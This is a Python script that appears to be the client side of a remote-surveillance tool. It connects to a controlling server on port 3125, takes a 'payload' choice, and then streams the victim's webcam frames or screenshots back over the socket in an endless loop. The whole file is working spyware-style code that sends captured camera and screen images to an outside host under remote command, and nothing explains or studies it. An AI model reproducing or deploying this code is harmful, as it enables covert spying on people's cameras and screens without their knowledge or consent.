import cv2
import io
import socket
import struct
import time
import pickle
import numpy as np

##############################
#                            #
#  Connection Establishment  #
#                            #
##############################

client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client_socket.connect(('', 3125))
connection = client_socket.makefile('wb')

##############################
#                            #
#     Generating Payload     #
#                            #
##############################


payloadOption = client_socket.recv(1024)
payloadOption = payloadOption.decode("utf-8") 
print("Option Selected:", payloadOption)


#######################
#                     #
#       Webcam        #
#                     #
#######################
if(payloadOption == "1"):

    print("Accessing Webcam")

    cam = cv2.VideoCapture(0)

    cam.set(3, 320);
    cam.set(4, 240);

    img_counter = 0

    encode_param = [int(cv2.IMWRITE_JPEG_QUALITY), 90]

    ##############################
    #                            #
    #       Sending Payload      #
    #                            #
    ##############################

    while True:
        ret, frame = cam.read()
        result, frame = cv2.imencode('.jpg', frame, encode_param)
        data = pickle.dumps(frame, 0)
        size = len(data)


        print("{}: {}".format(img_counter, size))
        client_socket.sendall(struct.pack(">L", size) + data)
        img_counter += 1

    cam.release()

#######################
#                     #
#       Screen        #
#                     #
#######################
elif(payloadOption == "2"):

    print("Accessing Screen")

    import pyautogui

    img_counter = 0

    encode_param = [int(cv2.IMWRITE_JPEG_QUALITY), 90]

    ##############################
    #                            #
    #       Sending Payload      #
    #                            #
    ##############################

    while True:
        screenshot = pyautogui.screenshot()
        screenshot = cv2.cvtColor(np.array(screenshot), cv2.COLOR_RGB2BGR)
        screenshot = screenshot[:, :, ::-1].copy()
        result, screenshot = cv2.imencode('.jpg', screenshot, encode_param)
        data = pickle.dumps(screenshot, 0)
        size = len(data)


        print("{}: {}".format(img_counter, size))
        client_socket.sendall(struct.pack(">L", size) + data)
        img_counter += 1

